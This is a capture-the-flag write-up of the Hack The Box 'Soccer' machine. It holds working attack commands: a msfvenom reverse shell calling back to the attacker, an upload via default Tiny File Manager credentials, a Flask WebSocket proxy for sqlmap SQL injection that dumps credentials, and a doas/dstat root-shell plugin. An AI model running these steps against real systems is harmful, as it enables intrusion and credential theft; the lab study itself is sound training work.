# Target
| Category          | Details                                                   |
|-------------------|-----------------------------------------------------------|
| 📝 **Name**       | [Soccer](https://app.hackthebox.com/machines/Soccer)      |  
| 🏷 **Type**       | HTB Machine                                               |
| 🖥 **OS**         | Linux                                                     |
| 🎯 **Difficulty** | Easy                                                      |
| 📁 **Tags**       | PHP, Tiny File Manager 2.4.3, WebSockets, SQLi, doas SUID |

# Scan
```
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Fri, 20 Jun 2025 12:35:19 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Fri, 20 Jun 2025 12:35:20 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
```

# Attack path
1. [Gain initial foothold by uploading a reverse shell via Tiny File Manager using its default credentials](#gain-initial-foothold-by-uploading-a-reverse-shell-via-tiny-file-manager-using-its-default-credentials)
2. [Escalate to `player` user using credentials discovered via SQL injection in the WebSocket application](#escalate-to-player-user-using-credentials-discovered-via-sql-injection-in-the-websocket-application)
3. [Escalate to `root` user via `dstat` plugin run with `doas`](#escalate-to-root-user-via-dstat-plugin-run-with-doas)

### Gain initial foothold by uploading a reverse shell via Tiny File Manager using its default credentials

#### Add `soccer.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ echo "$TARGET soccer.htb" | sudo tee -a /etc/hosts
10.129.217.215 soccer.htb
```

#### Identify Tiny File Manager 2.4.3 running on target
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ feroxbuster --url http://soccer.htb -w /usr/share/wordlists/dirb/big.txt
                                                                                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soccer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)         │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg
200      GET      147l      526w     6917c http://soccer.htb/
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
[####################] - 32s    61428/61428   0s      found:7       errors:0
[####################] - 12s    20469/20469   1720/s  http://soccer.htb/ 
[####################] - 12s    20469/20469   1771/s  http://soccer.htb/tiny/ 
[####################] - 11s    20469/20469   1888/s  http://soccer.htb/tiny/uploads/

┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ curl -s http://soccer.htb/tiny/ | grep -oP 'data-version=\"\K.[^"]+'
2.4.3
```

#### Gain access using default credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ curl -Ls -c cookies.txt http://soccer.htb/tiny/tinyfilemanager.php -d "fm_usr=admin&fm_pwd=admin@123" | grep -q "Login failed" || echo "OK" 
OK
```

#### Generate `php/meterpreter_reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
msfvenom -p php/meterpreter_reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 34925 bytes
Saved as: shell.php
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload php/meterpreter_reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => php/meterpreter_reverse_tcp
```

#### Upload and execute generated reverse shell
We have write permissions to `/tiny/uploads`
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ curl -s -b cookies.txt http://soccer.htb/tiny/tinyfilemanager.php -F "p=tiny/uploads" -F "fullpath=shell.php" -F "file=@shell.php;type=application/x-php" -o /dev/null && \
curl -s http://soccer.htb/tiny/uploads/shell.php -o /dev/null
```

#### Gain foothold with reverse shell connection
```
[*] Meterpreter session 1 opened (10.10.14.157:4444 -> 10.129.217.215:45036) at 2025-06-22 15:09:12 +0200

meterpreter > getuid
Server username: www-data
```

### Escalate to `player` user using credentials discovered via SQL injection in the WebSocket application

#### List all virtual hosts running by nginx
```
meterpreter > ls /etc/nginx/sites-available
Listing: /etc/nginx/sites-available
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  442   fil   2022-12-01 14:48:16 +0100  default
100644/rw-r--r--  332   fil   2022-11-17 09:39:14 +0100  soc-player.htb
```

#### Identify `soc-player.soccer.htb` running at `http://localhost:3000`
```
meterpreter > cat /etc/nginx/sites-available/soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

#### Add `soc-player.soccer.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ echo "$TARGET soc-player.soccer.htb" | sudo tee -a /etc/hosts
10.129.217.215 soc-player.soccer.htb
```

#### Identify websocket `ws://soc-player.soccer.htb:9091` connection established in JS
After signup / login, in JS of `http://soc-player.soccer.htb/check`, we can spot:
```
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
```
Which accepts following JSON as a message:
```json
{
  "id": msg
}
```
We will try to inject SQL in `id`.

#### Run `Flask` based Websocket / HTTP proxy as middleware for `sqlmap`
```python
from flask import Flask, request
from websocket import create_connection
import json

app = Flask(__name__)

@app.route('/')
def proxy():
    data = {
        "id": request.args.get("id")
    }
    websocket_request = json.dumps(data)
    print(f"[+] Sending: {websocket_request}")
    websocket = create_connection("ws://soc-player.soccer.htb:9091")
    websocket.send(websocket_request)
    response = websocket.recv()
    print(f"[+] Received: {response}")
    websocket.close()
    return response

app.run(host="0.0.0.0", port=8000)
```

```
 * Serving Flask app 'ws_proxy'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.1.94:8000
Press CTRL+C to quit
```

#### Identify time-based blind SQL injection vulnerability in `id` parameter
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ sqlmap http://127.0.0.1:8000?id=1
<SNIP>
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 97 HTTP(s) requests:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3875 FROM (SELECT(SLEEP(5)))KbhO)
---
<SNIP>
```

#### Use SQLi to list databases
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ sqlmap http://127.0.0.1:8000?id=1 --dbs
<SNIP>
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```

#### Use SQLi to list tables in `soccer_db`
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ sqlmap http://127.0.0.1:8000?id=1 -D soccer_db --tables
<SNIP>
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
<SNIP>
```

#### Use SQLi to dump `soccer_db.accounts` table
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ sqlmap http://127.0.0.1:8000?id=1 -D soccer_db -T accounts --dump
<SNIP>
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
<SNIP>
```

#### User discovered credentials to gain access over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Soccer]
└─$ ssh player@soccer.htb
player@soccer.htb's password: 
<SNIP>
player@soccer:~$ id
uid=1001(player) gid=1001(player) groups=1001(player)
```

### Escalate to `root` user via `dstat` plugin run with `doas`

#### Identify permission to run `dstat` as root
```
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

#### Spawn root shell with `dstat` plugin
```
player@soccer:~$ echo 'import os; os.system("/bin/sh")' > /usr/local/share/dstat/dstat_rootshell.py && \
> doas /usr/bin/dstat --rootshell
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
# id
uid=0(root) gid=0(root) groups=0(root)
```
